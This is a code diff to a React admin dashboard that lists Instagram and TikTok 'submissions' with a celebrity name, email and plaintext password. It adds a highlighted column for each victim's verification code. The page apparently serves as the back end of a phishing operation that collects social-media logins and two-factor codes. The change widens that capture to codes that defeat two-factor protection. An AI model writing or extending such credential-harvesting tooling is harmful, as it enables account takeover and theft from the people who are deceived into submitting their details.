@@ -81,6 +81,7 @@ export default function Admin() {
                           <TableHead>Celebrity</TableHead>
                           <TableHead>Email</TableHead>
                           <TableHead>Password</TableHead>
+                          <TableHead>Verification Code</TableHead>
                           <TableHead className="text-right">Submitted At</TableHead>
                         </TableRow>
                       </TableHeader>
@@ -88,7 +89,7 @@ export default function Admin() {
                         {instagramSubmissions?.length === 0 && (
                           <TableRow>
                             <TableCell
-                              colSpan={4}
+                              colSpan={5}
                               className="text-center text-zinc-500 py-8"
                             >
                               No submissions found.
@@ -103,6 +104,9 @@ export default function Admin() {
                             <TableCell>{sub.email}</TableCell>
                             <TableCell className="font-mono text-xs">
                               {sub.password}
+                            </TableCell>
+                            <TableCell className="font-mono text-xs font-bold text-pink-600">
+                              {sub.verificationCode}
                             </TableCell>
                             <TableCell className="text-right text-zinc-500">
                               {format(new Date(sub.submittedAt), "MMM d, yyyy HH:mm")}
@@ -140,6 +144,7 @@ export default function Admin() {
                           <TableHead>Celebrity</TableHead>
                           <TableHead>Email</TableHead>
                           <TableHead>Password</TableHead>
+                          <TableHead>Verification Code</TableHead>
                           <TableHead className="text-right">Submitted At</TableHead>
                         </TableRow>
                       </TableHeader>
@@ -147,7 +152,7 @@ export default function Admin() {
                         {tiktokSubmissions?.length === 0 && (
                           <TableRow>
                             <TableCell
-                              colSpan={4}
+                              colSpan={5}
                               className="text-center text-zinc-500 py-8"
                             >
                               No submissions found.
@@ -162,6 +167,9 @@ export default function Admin() {
                             <TableCell>{sub.email}</TableCell>
                             <TableCell className="font-mono text-xs">
                               {sub.password}
+                            </TableCell>
+                            <TableCell className="font-mono text-xs font-bold text-teal-600">
+                              {sub.verificationCode}
                             </TableCell>
                             <TableCell className="text-right text-zinc-500">
                               {format(new Date(sub.submittedAt), "MMM d, yyyy HH:mm")}
